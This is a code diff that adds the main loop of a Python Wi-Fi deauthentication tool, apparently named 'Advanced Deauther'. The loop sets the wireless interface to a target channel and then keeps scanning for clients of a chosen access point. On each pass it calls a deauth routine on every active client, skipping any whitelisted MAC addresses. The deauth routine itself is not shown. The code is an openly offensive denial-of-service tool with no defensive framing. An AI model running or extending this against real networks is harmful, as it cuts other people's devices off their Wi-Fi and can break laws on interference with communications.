@@ -111,3 +111,33 @@ def get_clients():
 
     return active_clients
 
+def main():
+    print(f"\n[i] Starting Advanced Deauther on {iface}")
+    print(f"[i] Target: {bssid} ({BAND}GHz, Channel {channel})")
+    print(f"[i] Whitelist: {', '.join(whitelist) if whitelist else 'None'}")
+    print(f"[i] Logging to: {logfile}\n")
+    
+    # Set channel
+    os.system(f"iwconfig {iface} channel {channel}")
+    
+    try:
+        while True:
+            clients = get_clients()
+            
+            if not clients:
+                print(f"[!] No clients detected on {BAND}GHz")
+            else:
+                print(f"[*] Active clients: {', '.join(clients)}")
+                for mac in clients:
+                    deauth(mac, "Active")
+            
+            time.sleep(scan_interval)
+    except KeyboardInterrupt:
+        print("\n[i] Stopping deauther...")
+    except Exception as e:
+        print(f"[!] Fatal error: {e}")
+    finally:
+        print("[i] Cleaning up...")
+
+if __name__ == "__main__":
+    main()
